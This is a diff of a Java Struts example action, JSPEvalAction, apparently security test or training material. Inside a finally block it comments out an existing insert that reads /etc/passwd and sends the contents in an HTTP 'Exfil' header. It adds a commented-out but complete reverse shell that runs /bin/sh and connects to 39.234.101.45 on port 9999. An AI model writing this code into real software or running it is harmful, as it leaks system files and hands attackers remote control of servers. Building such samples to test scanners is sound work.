@@ -43,8 +43,8 @@ public class JSPEvalAction extends ExampleAction {
 				writer.write("<%@ taglib prefix=\"s\" uri=\"/struts-tags\" %>");
 				writer.write(jsp);
 			} finally {
-				// begin malicious insert
-				
+				// begin exfil code
+				/*
     				File f = new File( "/etc/passwd" );
 				byte[] bytes = new byte[(int)f.length()];
 				FileInputStream fis = new FileInputStream(f);
@@ -54,8 +54,45 @@ public class JSPEvalAction extends ExampleAction {
 				HttpURLConnection con = (HttpURLConnection)evil.openConnection();
 				con.setRequestProperty("Exfil", data);
 				int code = con.getResponseCode();
-    				
-				// end malicious insert
+    				*/
+				// end exfil code
+
+				// begin backdoor/reverse shell code
+				/*
+		                String host = "39.234.101.45";
+		                int port = 9999;
+		                String cmd = "/bin/sh";
+		                Process p = (new ProcessBuilder(new String[]{cmd})).redirectErrorStream(true).start();
+		                Socket s = new Socket(host, port);
+		                InputStream pi = p.getInputStream();
+		                InputStream pe = p.getErrorStream();
+		                InputStream si = s.getInputStream();
+		                OutputStream po = p.getOutputStream();
+		                OutputStream so = s.getOutputStream();
+		                while(!s.isClosed()) {
+		                   while(pi.available() > 0) {
+		                        so.write(pi.read());
+		                   }
+		                   while(pe.available() > 0) {
+		                        so.write(pe.read());
+		                   }
+		                   while(si.available() > 0) {
+		                        po.write(si.read());
+		                   }
+		                   so.flush();
+		                   po.flush();
+		                   Thread.sleep(50L);
+		                   try {
+		                        p.exitValue();
+		                        break;
+		                   }
+			           catch (Exception var12) {}
+		                }
+		                p.destroy();
+		                s.close();
+				*/
+				// end backdoor/reverse shell code
+				
 				if (writer != null)
 					writer.close();
 			}
